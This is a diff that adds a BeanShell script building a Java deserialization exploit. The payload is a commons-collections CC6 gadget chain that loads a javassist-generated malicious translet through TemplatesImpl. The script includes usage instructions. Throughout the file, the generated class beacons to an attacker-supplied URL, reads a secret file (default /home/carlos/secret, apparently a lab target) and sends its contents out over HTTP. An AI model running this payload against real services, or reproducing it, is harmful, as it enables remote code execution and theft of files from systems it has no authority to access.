@@ -1,0 +1,219 @@
+/*
+ * TransletGen.bsh - CC6 (HashSet/TiedMapEntry/LazyMap/ChainedTransformer) payload whose
+ * inner chain ends in TemplatesImpl.newTransformer(), loading the javassist-built
+ * "Evil" translet (extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet)
+ * and running its static initializer, which fires HTTP beacons and exfiltrates a secret file.
+ *
+ * Execution path: BeanShell (bsh.Interpreter from tools/utils-bundle.jar). This host has a
+ * JRE-only Java 8 (no javac), and the jar bundles no compiler (no com/sun/tools/javac,
+ * no org/eclipse/jdt, no javax.tools impl). The canonical compilable Java source is
+ * TransletGen.java (same logic); this .bsh is its interpreted mirror.
+ *
+ * Usage (run with cwd = scripts dir so translet_raw.bin lands there):
+ *   java -cp "<utils-bundle.jar>;<scripts-dir>" bsh.Interpreter TransletGen.bsh <BEACON_URL> [SECRET_PATH]
+ * Fallback arg mechanism: -Dpsx.beacon=<URL> -Dpsx.secret=<PATH>
+ *
+ * Output: raw Java-serialized payload bytes -> stdout (binary) AND ./translet_raw.bin.
+ * Diagnostics -> stderr only (stdout must stay pure binary).
+ */
+
+// ---------- helpers ----------
+
+String toSrcType(Class c) {
+    if (!c.isArray()) return c.getName();
+    String n = c.getName();
+    int depth = 0;
+    while (n.charAt(depth) == '[') depth++;
+    String base = n.substring(depth);
+    String src;
+    if (base.startsWith("L") && base.endsWith(";")) {
+        src = base.substring(1, base.length() - 1);
+    } else if (base.equals("I")) { src = "int"; }
+    else if (base.equals("J")) { src = "long"; }
+    else if (base.equals("Z")) { src = "boolean"; }
+    else if (base.equals("B")) { src = "byte"; }
+    else if (base.equals("S")) { src = "short"; }
+    else if (base.equals("C")) { src = "char"; }
+    else if (base.equals("F")) { src = "float"; }
+    else if (base.equals("D")) { src = "double"; }
+    else { src = base; }
+    for (int k = 0; k < depth; k++) src = src + "[]";
+    return src;
+}
+
+void setF(Object o, String name, Object v) {
+    Class c = o.getClass();
+    while (c != null) {
+        try {
+            java.lang.reflect.Field f = c.getDeclaredField(name);
+            f.setAccessible(true);
+            f.set(o, v);
+            return;
+        } catch (java.lang.NoSuchFieldException e) {
+            c = c.getSuperclass();
+        }
+    }
+    throw new RuntimeException("field not found: " + name);
+}
+
+// ---------- args (bsh.args primary, -D properties fallback) ----------
+
+String beacon = null;
+String secretPath = "/home/carlos/secret";
+try {
+    String[] a = bsh.args;
+    if (a != null && a.length > 0) beacon = a[0];
+    if (a != null && a.length > 1 && a[1].length() > 0) secretPath = a[1];
+} catch (Throwable t0) { }
+if (beacon == null) beacon = java.lang.System.getProperty("psx.beacon");
+String propSecret = java.lang.System.getProperty("psx.secret");
+if (propSecret != null && propSecret.length() > 0) secretPath = propSecret;
+if (beacon == null) {
+    java.lang.System.err.println("[!] usage: bsh.Interpreter TransletGen.bsh <BEACON_URL> [SECRET_PATH]");
+    java.lang.System.exit(2);
+}
+if (beacon.endsWith("/")) beacon = beacon.substring(0, beacon.length() - 1);
+secretPath = secretPath.replace("\\", "/");
+java.lang.System.err.println("[*] java=" + java.lang.System.getProperty("java.version")
+    + " beacon=" + beacon + " secretPath=" + secretPath);
+
+// ---------- 1) build the Evil translet class with javassist ----------
+
+String sc = "";
+sc += "String B = \"" + beacon + "\";\n";
+sc += "try {\n";
+// beacon 1: alive
+sc += "  try {\n";
+sc += "    java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(B + \"/x/alive\").openConnection();\n";
+sc += "    c.setConnectTimeout(5000);\n";
+sc += "    c.setReadTimeout(5000);\n";
+sc += "    c.getResponseCode();\n";
+sc += "    try { c.getInputStream().close(); } catch (Exception ig1) {}\n";
+sc += "  } catch (Exception e1) {\n";
+sc += "    try {\n";
+sc += "      String es = java.net.URLEncoder.encode(String.valueOf(e1), \"UTF-8\");\n";
+sc += "      java.net.HttpURLConnection ce = (java.net.HttpURLConnection) new java.net.URL(B + \"/x/err?e=\" + es).openConnection();\n";
+sc += "      ce.setConnectTimeout(5000);\n";
+sc += "      ce.setReadTimeout(5000);\n";
+sc += "      ce.getResponseCode();\n";
+sc += "      try { ce.getInputStream().close(); } catch (Exception ig2) {}\n";
+sc += "    } catch (Exception e2) {}\n";
+sc += "  }\n";
+// read secret + exfil
+sc += "  try {\n";
+sc += "    byte[] d = java.nio.file.Files.readAllBytes(new java.io.File(\"" + secretPath + "\").toPath());\n";
+sc += "    String denc = java.net.URLEncoder.encode(new String(d, \"UTF-8\"), \"UTF-8\");\n";
+sc += "    java.net.HttpURLConnection cs = (java.net.HttpURLConnection) new java.net.URL(B + \"/x/s?d=\" + denc).openConnection();\n";
+sc += "    cs.setConnectTimeout(5000);\n";
+sc += "    cs.setReadTimeout(5000);\n";
+sc += "    cs.getResponseCode();\n";
+sc += "    try { cs.getInputStream().close(); } catch (Exception ig3) {}\n";
+sc += "  } catch (Exception e3) {\n";
+sc += "    try {\n";
+sc += "      String es2 = java.net.URLEncoder.encode(String.valueOf(e3), \"UTF-8\");\n";
+sc += "      java.net.HttpURLConnection ce2 = (java.net.HttpURLConnection) new java.net.URL(B + \"/x/err?e=\" + es2).openConnection();\n";
+sc += "      ce2.setConnectTimeout(5000);\n";
+sc += "      ce2.setReadTimeout(5000);\n";
+sc += "      ce2.getResponseCode();\n";
+sc += "      try { ce2.getInputStream().close(); } catch (Exception ig4) {}\n";
+sc += "    } catch (Exception e4) {}\n";
+sc += "  }\n";
+sc += "} catch (Throwable t9) {}\n";
+
+javassist.ClassPool pool = javassist.ClassPool.getDefault();
+javassist.CtClass ct = pool.makeClass("Evil");
+ct.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
+ct.makeClassInitializer().insertBefore(sc);
+
+// public no-arg constructor
+Object emptyCt = java.lang.reflect.Array.newInstance(Class.forName("javassist.CtClass"), 0);
+javassist.CtConstructor ctor = new javassist.CtConstructor(emptyCt, ct);
+ctor.setBody("{}");
+ct.addConstructor(ctor);
+
+// implement every abstract method discovered on AbstractTranslet (typically the two
+// transform() overloads) with empty bodies, so the translet class is concrete
+Class absCls = Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+java.lang.reflect.Method[] am = absCls.getMethods();
+java.util.Set seen = new java.util.HashSet();
+for (int i = 0; i < am.length; i++) {
+    java.lang.reflect.Method m = am[i];
+    if (!java.lang.reflect.Modifier.isAbstract(m.getModifiers())) continue;
+    Class[] pt = m.getParameterTypes();
+    String sig = m.getName() + "(";
+    for (int j = 0; j < pt.length; j++) {
+        if (j > 0) sig = sig + ", ";
+        sig = sig + toSrcType(pt[j]) + " p" + j;
+    }
+    sig = sig + ")";
+    if (seen.contains(sig)) continue;
+    seen.add(sig);
+    try {
+        String msrc = "public " + toSrcType(m.getReturnType()) + " " + sig + " {}";
+        ct.addMethod(javassist.CtNewMethod.make(msrc, ct));
+        java.lang.System.err.println("[+] impl abstract: " + msrc);
+    } catch (Throwable t) {
+        java.lang.System.err.println("[!] impl failed (non-fatal): " + sig + " :: " + t);
+    }
+}
+
+byte[] byteCode = ct.toBytecode();
+java.lang.System.err.println("[+] Evil bytecode: " + byteCode.length + " bytes");
+
+// ---------- 2) assemble TemplatesImpl via reflection ----------
+
+Object tm = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
+Object bcArr = java.lang.reflect.Array.newInstance(Class.forName("[B"), 1);
+java.lang.reflect.Array.set(bcArr, 0, byteCode);
+setF(tm, "_bytecodes", bcArr);
+setF(tm, "_name", "x");
+setF(tm, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());
+
+// ---------- 3) CC6 gadget chain (commons-collections 3.x) ----------
+// ConstantTransformer(templates) -> InvokerTransformer("newTransformer") inside a
+// ChainedTransformer; LazyMap + TiedMapEntry + HashSet with the build-time/removal
+// trick so hashCode fires the REAL chain only at deserialize time.
+
+Class tif = Class.forName("org.apache.commons.collections.Transformer");
+Object fakeArr = java.lang.reflect.Array.newInstance(tif, 1);
+java.lang.reflect.Array.set(fakeArr, 0,
+    new org.apache.commons.collections.functors.ConstantTransformer(Integer.valueOf(1)));
+Object chain = new org.apache.commons.collections.functors.ChainedTransformer(fakeArr);
+
+Object innerMap = new java.util.HashMap();
+Object lazyMap = org.apache.commons.collections.map.LazyMap.decorate(innerMap, chain);
+Object entry = new org.apache.commons.collections.keyvalue.TiedMapEntry(lazyMap, "foo");
+
+java.util.HashSet hset = new java.util.HashSet();
+hset.add(entry);          // hashCode fires the FAKE chain; inner map gets foo=1
+((java.util.Map) lazyMap).remove("foo");   // so the deser-time hashCode triggers the real chain
+
+Object realArr = java.lang.reflect.Array.newInstance(tif, 2);
+java.lang.reflect.Array.set(realArr, 0,
+    new org.apache.commons.collections.functors.ConstantTransformer(tm));
+java.lang.reflect.Array.set(realArr, 1,
+    new org.apache.commons.collections.functors.InvokerTransformer("newTransformer",
+        java.lang.reflect.Array.newInstance(Class.forName("java.lang.Class"), 0),
+        java.lang.reflect.Array.newInstance(Class.forName("java.lang.Object"), 0)));
+
+java.lang.reflect.Field fch =
+    Class.forName("org.apache.commons.collections.functors.ChainedTransformer").getDeclaredField("iTransformers");
+fch.setAccessible(true);
+fch.set(chain, realArr);
+
+// ---------- 4) serialize ----------
+
+java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
+java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(bos);
+oos.writeObject(hset);
+oos.close();
+byte[] bytes = bos.toByteArray();
+
+java.io.FileOutputStream fos = new java.io.FileOutputStream("translet_raw.bin");
+fos.write(bytes);
+fos.close();
+
+java.lang.System.out.write(bytes, 0, bytes.length);
+java.lang.System.out.flush();
+java.lang.System.err.println("[+] payload " + bytes.length + " bytes -> translet_raw.bin + stdout");
+return;
